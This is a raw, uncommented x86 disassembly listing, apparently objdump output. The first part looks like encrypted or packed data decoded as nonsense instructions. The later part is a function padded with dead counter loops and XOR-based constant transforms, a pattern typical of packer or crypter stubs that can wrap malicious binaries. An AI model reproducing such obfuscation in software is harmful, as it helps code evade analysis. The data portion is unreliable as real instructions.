  422056:	or     al,0x4c
  422058:	int3   
  422059:	in     eax,0x83
  42205b:	rol    edi,0x19
  42205e:	mov    eax,0x35ff8df1
  422063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422064:	add    DWORD PTR [edx+0x0],0xffffffff
  422068:	xor    eax,0x428423
  42206d:	push   DWORD PTR [ebp-0x28]
  422070:	push   DWORD PTR [ebp-0x2c]
  422073:	mov    eax,DWORD PTR [ebp-0x14]
  422076:	call   eax
  422078:	mov    eax,DWORD PTR [ebp-0x30]
  42207b:	jmp    0x4225fc
  422080:	xchg   ebp,eax
  422081:	rol    DWORD PTR [edx],0x97
  422084:	push   es
  422085:	mov    eax,DWORD PTR [edi+0x689842c3]
  42208b:	div    cl
  42208d:	mov    eax,0x8aa06103
  422092:	jge    0x42210e
  422094:	push   ds
  422095:	jno    0x422111
  422097:	jp     0x4220a4
  422099:	imul   ebx,DWORD PTR [eax-0x64],0x620842e
  4220a0:	inc    edx
  4220a1:	add    al,0x46
  4220a3:	add    eax,0x75cf1e80
  4220a8:	popf   
  4220a9:	xchg   ebx,eax
  4220aa:	inc    ecx
  4220ab:	mov    cl,0x29
  4220ad:	jmp    0x7febd45f
  4220b2:	shl    BYTE PTR [edx+0x45e414c2],0x34
  4220b9:	dec    ecx
  4220ba:	call   0x5d69:0xded655b
  4220c1:	sbb    ecx,DWORD PTR [esi-0x41]
  4220c4:	sub    al,0xc4
  4220c6:	xor    al,BYTE PTR [ebp-0x36]
  4220c9:	rcl    ebp,0x53
  4220cc:	sbb    DWORD PTR [ebp+0x10899898],ebp
  4220d2:	stos   BYTE PTR es:[edi],al
  4220d3:	xchg   ebp,eax
  4220d4:	lock xor esi,DWORD PTR [edx-0x520bd9e4]
  4220db:	mov    eax,ds:0xc4a71af6
  4220e0:	jle    0x4220d7
  4220e2:	add    cl,BYTE PTR [esi]
  4220e4:	bound  edx,QWORD PTR [eax-0x3c6633b8]
  4220ea:	jp     0x42211d
  4220ec:	fbstp  TBYTE PTR [eax+0x25]
  4220ef:	jl     0x422085
  4220f1:	and    DWORD PTR [esi+ecx*8+0x69618c05],0x68
  4220f9:	aas    
  4220fa:	inc    eax
  4220fb:	jmp    0x26bef80f
  422100:	jbe    0x4220d2
  422102:	jns    0x422139
  422104:	int3   
  422105:	scas   eax,DWORD PTR es:[edi]
  422106:	xchg   esp,eax
  422107:	in     eax,dx
  422108:	mov    ch,0x32
  42210a:	inc    ebp
  42210b:	lahf   
  42210c:	add    DWORD PTR [ebp+0x68],edi
  42210f:	mov    ds:0x661647fa,al
  422114:	mov    ch,0xb2
  422117:	and    al,0x82
  422119:	test   bl,ch
  42211b:	aas    
  42211c:	pop    ss
  42211d:	dec    esp
  42211e:	loop   0x42216d
  422120:	mov    cs,WORD PTR [edi+eax*4-0x6a]
  422124:	daa    
  422125:	stc    
  422126:	pop    esp
  422127:	xor    esp,ecx
  422129:	adc    eax,0xbf93f9ef
  42212e:	fdivr  DWORD PTR [edi+ecx*4+0x6f]
  422132:	mov    dh,0xc8
  422134:	xor    eax,esi
  422136:	inc    eax
  422137:	dec    esp
  422138:	jnp    0x4220d7
  42213a:	xchg   ebp,eax
  42213b:	and    al,0x3e
  42213d:	mov    BYTE PTR [edx+0x33],ah
  422140:	cmp    ebp,DWORD PTR ds:0x9037373d
  422146:	loop   0x4220e2
  422148:	daa    
  422149:	imul   eax,DWORD PTR [edi],0x445dc85b
  42214f:	lahf   
  422150:	inc    edi
  422151:	pop    edi
  422152:	fs cli 
  422154:	daa    
  422155:	sub    eax,0xe2fe4727
  42215a:	cmp    bh,BYTE PTR [eax-0x44]
  42215d:	cmp    bl,BYTE PTR [ebx]
  42215f:	sbb    DWORD PTR ds:0x16dc52c2,0xcf6d0037
  422169:	nop
  42216a:	out    dx,al
  42216b:	(bad)
  42216f:	jmp    0x4221d2
  422171:	pusha  
  422172:	mov    esp,0xb4befa96
  422177:	cmp    BYTE PTR [edi+0x29],ch
  42217a:	jbe    0x42218d
  42217c:	test   al,0x95
  42217e:	jo     0x422105
  422180:	scas   al,BYTE PTR es:[edi]
  422181:	xor    DWORD PTR [esi],esi
  422183:	push   ds
  422184:	sub    ah,bh
  422186:	sti    
  422187:	loop   0x422165
  422189:	daa    
  42218a:	leave  
  42218b:	imul   ecx,DWORD PTR [edi+eiz*8+0x299250d9],0xa6206c33
  422196:	inc    ebp
  422197:	clc    
  422198:	retf   0xb82a
  42219b:	xor    BYTE PTR [edi],dl
  42219d:	(bad)  
  42219e:	rol    BYTE PTR [edx],1
  4221a0:	mov    ebx,ebp
  4221a2:	push   esi
  4221a3:	xchg   BYTE PTR [edi-0x32],bh
  4221a6:	push   es
  4221a7:	aas    
  4221a8:	lahf   
  4221a9:	rol    BYTE PTR [edx*4-0x49e2a022],0xbc
  4221b1:	and    DWORD PTR [eax-0x7496ce25],edi
  4221b7:	jae    0x4221da
  4221b9:	iret   
  4221ba:	(bad)  
  4221bb:	push   ss
  4221bc:	dec    edi
  4221bd:	data16 mov ah,0x4
  4221c0:	out    0x7a,al
  4221c2:	std    
  4221c3:	lods   eax,DWORD PTR ds:[esi]
  4221c4:	sbb    al,0xdb
  4221c6:	outs   dx,BYTE PTR ds:[esi]
  4221c7:	and    BYTE PTR [ecx-0x576427a3],0x5b
  4221ce:	adc    al,0x40
  4221d0:	inc    esp
  4221d1:	mov    ah,0xef
  4221d3:	cdq    
  4221d4:	fnstcw WORD PTR [ebp-0x18412899]
  4221da:	push   0xbf50f0c5
  4221df:	mov    ebx,0x33d01b9
  4221e4:	push   cs
  4221e5:	ret    0xd569
  4221e8:	aam    0x2c
  4221ea:	shr    BYTE PTR [ebp-0x28],1
  4221ed:	loop   0x4221dc
  4221ef:	into   
  4221f0:	add    DWORD PTR [edx+0x7a],eax
  4221f3:	mov    ds:0x23c69b78,eax
  4221f8:	pop    ds
  4221f9:	mov    bl,0x64
  4221fb:	pop    ecx
  4221fc:	jmp    0x4ea0e5e9
  422201:	mov    ecx,0xbed63c2b
  422206:	dec    ecx
  422207:	fdiv   QWORD PTR [ebp-0x1d359bb1]
  42220d:	xchg   BYTE PTR [ecx+eiz*1],al
  422210:	or     DWORD PTR [ebx],esi
  422212:	add    edi,DWORD PTR [esi]
  422214:	sub    eax,0xfd1136ab
  422219:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42221a:	loop   0x422265
  42221c:	out    dx,al
  42221d:	push   ebx
  42221e:	mov    ch,0x7d
  422220:	push   cs
  422221:	push   esi
  422222:	fiadd  WORD PTR [eax-0x32]
  422225:	fldcw  WORD PTR [eax-0x13083ed3]
  42222b:	push   ds
  42222c:	aam    0xb9
  42222e:	call   0xc894dc71
  422233:	cmp    bl,BYTE PTR [edx+0x60]
  422236:	sbb    BYTE PTR [edx-0x641ca250],0x7f
  42223d:	inc    ebx
  42223e:	push   0x79
  422240:	cmc    
  422241:	adc    edx,ebp
  422243:	xchg   edi,eax
  422244:	xor    DWORD PTR [eax],eax
  422246:	sub    dh,BYTE PTR [eax+edi*8+0x1f]
  42224a:	std    
  42224b:	retf   
  42224c:	sub    al,bh
  42224e:	not    BYTE PTR ss:[edx-0x79ac0bf0]
  422255:	hlt    
  422256:	xor    cl,BYTE PTR [eax-0x5b]
  422259:	mov    ebp,0xd58d4683
  42225e:	pop    ebx
  42225f:	ins    BYTE PTR es:[edi],dx
  422260:	dec    esp
  422261:	lock add BYTE PTR [esp+edi*8+0x49],ch
  422266:	sahf   
  422267:	jbe    0x4222b9
  422269:	mov    eax,ds:0x6ef5e544
  42226e:	cwde   
  42226f:	enter  0xb6f6,0x3e
  422273:	lods   eax,DWORD PTR ds:[esi]
  422274:	mov    cl,0xb6
  422276:	das    
  422277:	add    eax,0x8ed1aa1b
  42227c:	ins    DWORD PTR es:[edi],dx
  42227d:	pop    edx
  42227e:	stos   BYTE PTR es:[edi],al
  42227f:	fdiv   st(7),st
  422281:	aad    0x11
  422283:	and    DWORD PTR [ecx],esi
  422285:	or     esp,ecx
  422287:	adc    ch,BYTE PTR [ebp-0x3c]
  42228a:	leave  
  42228b:	dec    ecx
  42228c:	fsubrp st(1),st
  42228e:	(bad)  
  42228f:	mov    edi,0xbc212820
  422294:	int    0x94
  422296:	xchg   al,ah
  422298:	pop    ss
  422299:	sbb    al,0xba
  42229b:	cwde   
  42229c:	loopne 0x422229
  42229e:	aad    0x2b
  4222a0:	inc    eax
  4222a1:	jmp    0xc4cfabd2
  4222a6:	cmp    cl,BYTE PTR [edx]
  4222a8:	aad    0xfc
  4222aa:	ret    
  4222ab:	lods   al,BYTE PTR ds:[esi]
  4222ac:	fxtract 
  4222ae:	iret   
  4222af:	rol    esi,cl
  4222b1:	into   
  4222b2:	inc    edi
  4222b3:	(bad)  
  4222b4:	or     al,0x3a
  4222b6:	and    ebp,DWORD PTR [ecx]
  4222b8:	rcr    ah,cl
  4222ba:	inc    eax
  4222bb:	jnp    0x4222ff
  4222bd:	xor    dl,0x60
  4222c0:	lods   eax,DWORD PTR ds:[esi]
  4222c1:	or     BYTE PTR [eax],0x52
  4222c4:	mov    ecx,0x6ba638db
  4222c9:	stos   BYTE PTR es:[edi],al
  4222ca:	mov    ds:0x5908d347,eax
  4222cf:	xchg   esi,eax
  4222d0:	sbb    BYTE PTR [esi+esi*1-0x7f],ch
  4222d4:	adc    al,BYTE PTR [edx]
  4222d6:	sub    al,0x96
  4222d8:	icebp  
  4222d9:	push   esi
  4222da:	loope  0x422296
  4222dc:	sbb    edi,DWORD PTR [esi+0x2b]
  4222df:	fsub   QWORD PTR ds:[ebx+0x5a]
  4222e3:	ffreep st(5)
  4222e5:	dec    eax
  4222e6:	dec    esp
  4222e7:	data16 fadd QWORD PTR [edx+ecx*8-0x14]
  4222ec:	test   al,0x9
  4222ee:	and    eax,0x7d6e7ef1
  4222f3:	xor    al,0x5
  4222f5:	jns    0x42233e
  4222f7:	xchg   esi,ebx
  4222f9:	sub    al,0x4c
  4222fb:	push   ebx
  4222fc:	rcr    DWORD PTR [ebx],0x22
  4222ff:	or     ch,BYTE PTR [edi+ebp*2]
  422302:	cmp    BYTE PTR [edx],bh
  422304:	dec    edx
  422305:	mov    ecx,DWORD PTR [esi+0xc]
  422308:	xor    DWORD PTR [eax],edx
  42230a:	mov    edx,0x842f1342
  42230f:	mov    ch,0x32
  422311:	int3   
  422312:	fisub  WORD PTR [eax+0x25]
  422315:	sbb    bl,BYTE PTR [edi]
  422317:	pop    edi
  422318:	shr    BYTE PTR [ebp+0x64],0x15
  42231c:	xor    al,0xad
  42231e:	scas   al,BYTE PTR es:[edi]
  42231f:	sub    ebx,DWORD PTR [ebp+0x3a]
  422322:	into   
  422323:	call   0x451415d1
  422328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422329:	xchg   edi,eax
  42232a:	ret    
  42232b:	sbb    BYTE PTR [eax+0x36ce1d58],bl
  422331:	jns    0x4222b5
  422333:	pop    edi
  422334:	sbb    eax,0x33dec75d
  422339:	les    ebp,FWORD PTR [edx+0x38]
  42233c:	aaa    
  42233d:	fbstp  TBYTE PTR fs:[edi-0x2]
  422341:	jns    0x422370
  422343:	mov    bl,0x54
  422345:	xor    ch,BYTE PTR [eax+ebx*2]
  422348:	pusha  
  422349:	std    
  42234a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42234b:	pop    ss
  42234c:	dec    eax
  42234d:	stos   DWORD PTR es:[edi],eax
  42234e:	push   ebp
  42234f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422350:	xchg   edx,eax
  422351:	stos   BYTE PTR es:[edi],al
  422352:	out    0x80,eax
  422354:	adc    eax,0xe197fa1f
  422359:	push   ecx
  42235a:	fldenv [esi+edx*4+0x38094713]
  422361:	xchg   BYTE PTR [esi+0x62],ah
  422364:	int3   
  422365:	ror    DWORD PTR [ebx-0x5a],cl
  422368:	mov    edx,0x4cf73cd5
  42236d:	aad    0xb9
  42236f:	jae    0x422388
  422371:	call   0xbd83:0x570d4261
  422378:	mov    ch,0x14
  42237a:	and    BYTE PTR [ebp+0x5ffd059],dh
  422380:	cs retf 0xf8a5
  422384:	dec    ebx
  422386:	inc    eax
  422387:	push   ebp
  422388:	arpl   WORD PTR [edi],bx
  42238a:	imul   esi,DWORD PTR [ebx+0x10],0xfffffff9
  42238e:	adc    edx,DWORD PTR [eax]
  422390:	lods   eax,DWORD PTR ds:[esi]
  422391:	clc    
  422392:	loope  0x42235a
  422394:	push   es
  422395:	cmp    al,0x8
  422397:	xor    edx,DWORD PTR [edx+0x6a7f8831]
  42239d:	adc    eax,0x4c4f6bc6
  4223a2:	loop   0x42240a
  4223a4:	sbb    dh,BYTE PTR [ebp+0xa]
  4223a7:	hlt    
  4223a8:	fwait
  4223a9:	cmc    
  4223aa:	jae    0x4223e4
  4223ac:	and    bl,bh
  4223ae:	gs das 
  4223b0:	adc    eax,0xbdfca79a
  4223b5:	cmp    al,dl
  4223b7:	inc    esp
  4223b8:	adc    eax,0x6d6d2534
  4223bd:	adc    ch,ah
  4223bf:	xchg   esi,eax
  4223c0:	and    bh,dl
  4223c2:	mov    ecx,0xdd8c41cd
  4223c7:	adc    BYTE PTR [edx-0x48],ch
  4223ca:	push   edx
  4223cb:	pushf  
  4223cc:	ffree  st(3)
  4223ce:	cmp    bl,cl
  4223d0:	not    DWORD PTR [edx+0x2]
  4223d3:	push   DWORD PTR [ebx+0x49]
  4223d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223d7:	add    DWORD PTR [esi-0x30069dfa],ecx
  4223dd:	fidivr DWORD PTR [esi+0x3]
  4223e0:	xchg   BYTE PTR [edi-0x7671f817],al
  4223e6:	add    esi,DWORD PTR [edx-0x54755723]
  4223ec:	inc    eax
  4223ed:	retf   0xf8ad
  4223f0:	add    ah,BYTE PTR [ecx+0xf]
  4223f3:	adc    al,0x8e
  4223f5:	adc    DWORD PTR [ebp-0x642f037c],esi
  4223fb:	(bad)  
  4223fc:	and    BYTE PTR [edi],ah
  4223fe:	mov    cl,0xf0
  422400:	sti    
  422401:	scas   al,BYTE PTR es:[edi]
  422402:	cwde   
  422403:	bound  ebx,QWORD PTR [esi+0x73]
  422406:	mov    eax,0x41347ac
  42240b:	push   ds
  42240c:	push   edx
  42240d:	sub    esi,DWORD PTR [eax-0x5b6b2ee4]
  422413:	adc    eax,0xf8edfacc
  422418:	add    BYTE PTR [edx-0x2a],ah
  42241b:	call   0xa421:0x3d99ca76
  422422:	in     al,dx
  422423:	je     0x4223cb
  422425:	mov    dl,0xf0
  422427:	cmp    eax,0x174b2fd2
  42242c:	add    ebx,DWORD PTR [ebp-0xf543986]
  422432:	sbb    esi,0xee4935bd
  422438:	adc    bh,0xd4
  42243b:	push   ds
  42243c:	mov    ds:0x2dcb056d,eax
  422441:	ins    DWORD PTR es:[edi],dx
  422442:	xor    al,0x53
  422444:	outs   dx,BYTE PTR ds:[esi]
  422445:	xor    al,0x24
  422447:	aad    0xed
  422449:	jbe    0x42244a
  42244b:	adc    edi,DWORD PTR [ebp-0x62]
  42244e:	test   DWORD PTR [eax],esp
  422450:	jae    0x4223f0
  422452:	cwde   
  422453:	test   eax,0xbd89bf11
  422458:	adc    eax,0xe7ceb389
  42245d:	leave  
  42245e:	cld    
  42245f:	imul   ebx,eax,0x58076658
  422465:	repnz aad 0xc
  422468:	cmp    DWORD PTR [edx+0x356fd807],ebp
  42246e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246f:	push   ss
  422470:	inc    edi
  422471:	mov    ah,0x5a
  422473:	mov    esi,0x9228a83f
  422478:	cli    
  422479:	imul   esi,DWORD PTR [ebx],0x759bc9fa
  42247f:	(bad)  
  422480:	aas    
  422481:	and    edx,edi
  422483:	jp     0x4224cf
  422485:	inc    ebx
  422486:	aam    0x50
  422488:	mov    al,ds:0xb728a939
  42248d:	xor    dl,ch
  42248f:	ror    DWORD PTR [ebx+0x41],1
  422492:	xor    BYTE PTR [edx-0x39c7b057],cl
  422498:	arpl   WORD PTR [eax+0x359b249b],sp
  42249e:	pop    edi
  42249f:	xchg   esp,eax
  4224a0:	or     BYTE PTR [ebx-0x20],dh
  4224a3:	inc    ecx
  4224a4:	adc    BYTE PTR [ebx-0x3d],bh
  4224a7:	out    0xdf,al
  4224a9:	mov    esp,0x3d8bce67
  4224ae:	jl     0x422470
  4224b0:	(bad)  
  4224b1:	mov    edx,0x6fcb08af
  4224b6:	xchg   ecx,eax
  4224b7:	inc    edi
  4224b8:	scas   al,BYTE PTR es:[edi]
  4224b9:	lea    edx,[edx-0x4c]
  4224bc:	test   eax,0x5de2523b
  4224c1:	jl     0x4224f3
  4224c3:	arpl   WORD PTR [ebx],sp
  4224c5:	ret    
  4224c6:	pop    ss
  4224c7:	rcr    ebp,1
  4224c9:	mov    bh,0xab
  4224cb:	pop    eax
  4224cc:	out    0x6f,al
  4224ce:	jl     0x42254e
  4224d0:	sbb    DWORD PTR [esi],0xdde314b7
  4224d6:	mov    eax,ds:0xbae2a664
  4224db:	cmp    ch,BYTE PTR [eax-0x42]
  4224de:	(bad)  
  4224df:	fmul   DWORD PTR [edx-0x5fe9584d]
  4224e5:	cli    
  4224e6:	clc    
  4224e7:	sub    al,BYTE PTR [ecx+ebp*4]
  4224ea:	shr    BYTE PTR [eax+ebx*4-0x7eb6b9ab],1
  4224f1:	ficom  WORD PTR [ebx]
  4224f3:	sbb    al,0xe5
  4224f5:	and    ch,BYTE PTR [edx+0x12e3a5f8]
  4224fb:	xchg   edx,eax
  4224fc:	dec    esp
  4224fd:	mov    al,0x94
  4224ff:	sub    edi,eax
  422501:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422502:	jle    0x422507
  422504:	dec    esp
  422505:	dec    esi
  422506:	xchg   bl,bl
  422508:	mov    bl,0x7
  42250a:	jmp    0xb9c0:0x93a059df
  422511:	sub    eax,0x3ea5d76c
  422516:	stos   BYTE PTR es:[edi],al
  422517:	xchg   ebx,eax
  422518:	pusha  
  422519:	push   esi
  42251a:	fistp  WORD PTR [ebx+esi*8-0x7e5383d]
  422521:	jecxz  0x4224b6
  422523:	dec    esi
  422524:	xchg   edi,eax
  422525:	and    eax,0x206a3ec2
  42252a:	test   DWORD PTR [eax],esi
  42252c:	and    ebp,DWORD PTR [esp+ecx*4+0x52]
  422530:	add    BYTE PTR [edi-0x7f6fbc0],0x55
  422537:	sub    ebx,DWORD PTR [eax+0x4f]
  42253a:	mov    eax,0xadaaea5b
  42253f:	jmp    0xe36b0e13
  422544:	jnp    0x4225c3
  422546:	shr    DWORD PTR [ecx+0xe],0x7b
  42254a:	pop    ds
  42254b:	stc    
  42254c:	and    DWORD PTR gs:[ecx-0x9575b36],edx
  422553:	lods   al,BYTE PTR ds:[esi]
  422554:	mov    dl,0x7f
  422556:	cli    
  422557:	cli    
  422558:	aaa    
  422559:	rcr    BYTE PTR [esi],1
  42255b:	and    eax,DWORD PTR [eax-0x38]
  42255e:	ins    BYTE PTR es:[edi],dx
  42255f:	push   eax
  422560:	jo     0x4224e2
  422562:	stos   BYTE PTR es:[edi],al
  422563:	ret    0xe815
  422566:	push   cs
  422567:	jb     0x422555
  422569:	mov    al,BYTE PTR [ebx]
  42256b:	(bad)  
  42256c:	cli    
  42256d:	inc    ecx
  42256e:	fld    TBYTE PTR [ebx-0x5434431]
  422574:	aas    
  422575:	call   0xc4ecfb9d
  42257a:	pop    es
  42257b:	rcl    DWORD PTR [edi-0x44],0x2d
  42257f:	pop    ecx
  422580:	push   es
  422581:	mov    eax,ds:0xcbcacb35
  422586:	push   ss
  422587:	pop    ss
  422588:	rcl    dh,0xef
  42258b:	dec    eax
  42258c:	lea    ecx,ds:0xdf73faab
  422592:	inc    edx
  422593:	or     al,0xfc
  422595:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422596:	dec    ecx
  422597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422598:	push   edi
  422599:	int    0x5f
  42259b:	inc    esp
  42259c:	and    BYTE PTR [edi-0x13],bl
  42259f:	xchg   al,dl
  4225a1:	jns    0x4225cf
  4225a3:	je     0x422622
  4225a5:	jnp    0x422610
  4225a7:	(bad)  
  4225a8:	xchg   esp,eax
  4225a9:	in     eax,dx
  4225aa:	sub    esp,DWORD PTR [ecx+ebp*1+0x76]
  4225ae:	add    BYTE PTR [edx+0x30ad0a47],dl
  4225b4:	(bad)  
  4225b5:	jmp    0x6738:0xb8296def
  4225bc:	(bad)  
  4225bd:	and    cl,BYTE PTR [ecx+0x39865f56]
  4225c3:	add    al,0xe6
  4225c5:	cmp    WORD PTR [edx],cx
  4225c8:	lock sti 
  4225ca:	std    
  4225cb:	repz rol esi,cl
  4225ce:	pusha  
  4225cf:	mov    WORD PTR [esi+0xb6a5a58],fs
  4225d5:	cld    
  4225d6:	or     al,0x87
  4225d8:	pop    es
  4225d9:	push   ds
  4225da:	repz adc eax,0xdb80ced5
  4225e0:	inc    ebx
  4225e1:	ret    0xb6bc
  4225e4:	lock call 0x5761:0xddcd6ad
  4225ec:	out    dx,eax
  4225ed:	test   al,0x85
  4225f0:	gs out dx,eax
  4225f2:	fs retf 
  4225f4:	mov    ds:0x3e163f8,eax
  4225f9:	hlt    
  4225fa:	xlat   BYTE PTR ds:[ebx]
  4225fb:	mov    ecx,DWORD PTR fs:0x42836b
  422602:	add    DWORD PTR [eax],ecx
  422604:	pop    edi
  422605:	pop    esi
  422606:	leave  
  422607:	ret    
  422608:	push   ebp
  422609:	mov    ebp,esp
  42260b:	sub    esp,0x18
  42260e:	mov    DWORD PTR [ebp-0x10],0xf89f85b0
  422615:	movzx  edx,WORD PTR ds:0x428673
  42261c:	and    edx,DWORD PTR ds:0x42864f
  422622:	mov    DWORD PTR ds:0x428673,edx
  422628:	lea    eax,[ebp+0x14]
  42262b:	adc    DWORD PTR ds:0x428607,0x604f
  422635:	mov    DWORD PTR [ebp-0x4],eax
  422638:	mov    ecx,DWORD PTR ds:0x4285f3
  42263e:	adc    DWORD PTR ds:0x4285df,ecx
  422644:	push   esi
  422645:	add    DWORD PTR ds:0x42861b,ecx
  42264b:	mov    esi,0xf89c85b0
  422650:	or     DWORD PTR ds:0x4285db,0x4285f7
  42265a:	mov    DWORD PTR [ebp-0xc],esi
  42265d:	mov    DWORD PTR ds:0x42862f,0x1a
  422667:	cmp    DWORD PTR ds:0x42862f,0x0
  42266e:	je     0x4226d2
  422674:	cmp    DWORD PTR ds:0x42862f,0xa
  42267b:	jge    0x4226d2
  422681:	jmp    0x4226a6
  422686:	push   0x428673
  42268b:	push   DWORD PTR [ebp-0x20]
  42268e:	push   0x8204
  422693:	push   0x6126
  422698:	push   0x7868
  42269d:	push   DWORD PTR [ebp-0x28]
  4226a0:	call   DWORD PTR ds:0x4287c7
  4226a6:	cmp    DWORD PTR ds:0x42862f,0xb
  4226ad:	jne    0x4226c0
  4226b3:	mov    edx,DWORD PTR ds:0x42862f
  4226b9:	dec    edx
  4226ba:	mov    DWORD PTR ds:0x42862f,edx
  4226c0:	mov    edx,DWORD PTR ds:0x42862f
  4226c6:	dec    edx
  4226c7:	mov    DWORD PTR ds:0x42862f,edx
  4226cd:	jmp    0x422667
  4226d2:	lea    eax,[ebp-0xc]
  4226d5:	mov    DWORD PTR [ebp-0x14],eax
  4226d8:	mov    eax,DWORD PTR [ebp-0xc]
  4226db:	or     DWORD PTR ds:0x42863f,0x672c
  4226e5:	mov    edx,DWORD PTR [ebp-0x14]
  4226e8:	mov    ecx,0x75108a4
  4226ed:	add    DWORD PTR ds:0x428617,0x428607
  4226f7:	xor    eax,ecx
  4226f9:	add    eax,0x3272ec
  4226fe:	sub    DWORD PTR ds:0x42862b,0x430
  422708:	mov    DWORD PTR [edx],eax
  42270a:	movzx  eax,WORD PTR ds:0x42861b
  422711:	sbb    eax,DWORD PTR ds:0x4285cf
  422717:	mov    ds:0x42861b,eax
  42271c:	mov    eax,ds:0x428167
  422721:	mov    DWORD PTR ds:0x428617,0x1a
  42272b:	cmp    DWORD PTR ds:0x428617,0x0
  422732:	je     0x42276e
  422738:	cmp    DWORD PTR ds:0x428617,0x2a
  42273f:	jl     0x42276e
  422745:	jmp    0x42275a
  42274a:	push   0x42860b
  42274f:	push   0x428083
  422754:	call   DWORD PTR ds:0x4287cb
  42275a:	xor    edx,edx
  42275c:	xor    edx,DWORD PTR ds:0x428617
  422762:	dec    edx
  422763:	mov    DWORD PTR ds:0x428617,edx
  422769:	jmp    0x42272b
  42276e:	mov    edx,DWORD PTR [ebp-0x4]
  422771:	mov    eax,DWORD PTR [eax]
  422773:	add    eax,DWORD PTR [edx]
  422775:	neg    edx
  422777:	push   edi
  422778:	and    DWORD PTR ds:0x428613,0x0
  422782:	jmp    0x422794
  422787:	mov    edi,DWORD PTR ds:0x428613
  42278d:	inc    edi
  42278e:	mov    DWORD PTR ds:0x428613,edi
  422794:	cmp    DWORD PTR ds:0x428613,0x13
  42279b:	jae    0x4227d3
  4227a1:	cmp    DWORD PTR ds:0x428613,0x14
  4227a8:	jb     0x4227d3
  4227ae:	jmp    0x4227ce
  4227b3:	push   0x5e63
  4227b8:	push   DWORD PTR [ebp-0x10]
  4227bb:	push   0x40fa
  4227c0:	push   0x57ff
  4227c5:	push   DWORD PTR [ebp-0x14]
  4227c8:	call   DWORD PTR ds:0x42879f
  4227ce:	jmp    0x422787
  4227d3:	mov    DWORD PTR [ebp-0x8],eax
  4227d6:	mov    edi,DWORD PTR [ebp+0x8]
  4227d9:	mov    DWORD PTR ds:0x428643,0x13
  4227e3:	cmp    DWORD PTR ds:0x428643,0x0
  4227ea:	je     0x422838
  4227f0:	cmp    DWORD PTR ds:0x428643,0x8
  4227f7:	jb     0x422838
  4227fd:	jmp    0x42280d
  422802:	push   0x6e63
  422807:	call   DWORD PTR ds:0x4287a3
  42280d:	cmp    DWORD PTR ds:0x428643,0x9
  422814:	jne    0x422825
  42281a:	mov    eax,ds:0x428643
  42281f:	dec    eax
  422820:	mov    ds:0x428643,eax
  422825:	xor    eax,eax
  422827:	xor    eax,DWORD PTR ds:0x428643
  42282d:	dec    eax
  42282e:	mov    ds:0x428643,eax
  422833:	jmp    0x4227e3
  422838:	mov    eax,ds:0x4282ef
  42283d:	and    DWORD PTR ds:0x428647,0x0
  422847:	xor    edx,edx
  422849:	or     edx,DWORD PTR ds:0x428647
  42284f:	inc    edx
  422850:	mov    DWORD PTR ds:0x428647,edx
  422856:	cmp    DWORD PTR ds:0x428647,0x8
  42285d:	jb     0x42289d
  422863:	jmp    0x422876
  422868:	push   DWORD PTR [ebp-0x18]
  42286b:	push   0x42804c
  422870:	call   DWORD PTR ds:0x4287a7
  422876:	cmp    DWORD PTR ds:0x428647,0x7
  42287d:	jne    0x422890
  422883:	mov    edx,DWORD PTR ds:0x428647
  422889:	inc    edx
  42288a:	mov    DWORD PTR ds:0x428647,edx
  422890:	cmp    DWORD PTR ds:0x428647,0x16
  422897:	jb     0x422847
  42289d:	mov    eax,DWORD PTR [eax+0x198]
  4228a3:	and    DWORD PTR ds:0x428637,0x0
  4228ad:	mov    edx,DWORD PTR ds:0x428637
  4228b3:	inc    edx
  4228b4:	mov    DWORD PTR ds:0x428637,edx
  4228ba:	cmp    DWORD PTR ds:0x428637,0x9
  4228c1:	jg     0x422905
  4228c7:	jmp    0x4228dc
  4228cc:	push   0x428034
  4228d1:	push   0x1
  4228d3:	push   DWORD PTR [ebp-0x1c]
  4228d6:	call   DWORD PTR ds:0x4287ab
  4228dc:	cmp    DWORD PTR ds:0x428637,0x8
  4228e3:	jne    0x4228f8
  4228e9:	xor    edx,edx
  4228eb:	add    edx,DWORD PTR ds:0x428637
  4228f1:	inc    edx
  4228f2:	mov    DWORD PTR ds:0x428637,edx
  4228f8:	cmp    DWORD PTR ds:0x428637,0x18
  4228ff:	jb     0x4228ad
  422905:	xor    edi,ecx
  422907:	mov    edx,0x3272ec
  42290c:	add    edi,edx
  42290e:	cmp    DWORD PTR [eax],edi
  422910:	je     0x422931
  422916:	mov    DWORD PTR ds:0x42861f,0x7dc0
  422920:	mov    eax,DWORD PTR [eax]
  422922:	mov    DWORD PTR ds:0x428607,0x131c
  42292c:	jmp    0x422bbf
  422931:	mov    DWORD PTR ds:0x4285e3,edi
  422937:	mov    eax,DWORD PTR [ebp+0x18]
  42293a:	cmp    eax,esi
  42293c:	mov    DWORD PTR ds:0x42864f,0x3fa2
  422946:	jne    0x42296a
  42294c:	mov    DWORD PTR ds:0x42860b,0x3d29
  422956:	push   0xf89c85b1
  42295b:	mov    DWORD PTR ds:0x42866b,0x6bac
  422965:	jmp    0x422bae
  42296a:	mov    esi,DWORD PTR [ebp+0x18]
  42296d:	mov    eax,0x14b4
  422972:	mov    eax,0xf89c85b2
  422977:	cmp    esi,eax
  422979:	jne    0x422b9e
  42297f:	mov    eax,DWORD PTR [ebp+0x10]
  422982:	adc    DWORD PTR ds:0x4285cf,0x1af0
  42298c:	xor    eax,ecx
  42298e:	mov    esi,DWORD PTR ds:0x4285ef
  422994:	sub    DWORD PTR ds:0x42860f,esi
  42299a:	add    eax,edx
  42299c:	and    DWORD PTR ds:0x42863f,0x0
  4229a6:	jmp    0x4229ba
  4229ab:	xor    esi,esi
  4229ad:	xor    esi,DWORD PTR ds:0x42863f
  4229b3:	inc    esi
  4229b4:	mov    DWORD PTR ds:0x42863f,esi
  4229ba:	cmp    DWORD PTR ds:0x42863f,0x1d
  4229c1:	jae    0x422a03
  4229c7:	cmp    DWORD PTR ds:0x42863f,0xa
  4229ce:	jl     0x422a03
  4229d4:	jmp    0x4229e4
  4229d9:	push   0x428028
  4229de:	call   DWORD PTR ds:0x4287af
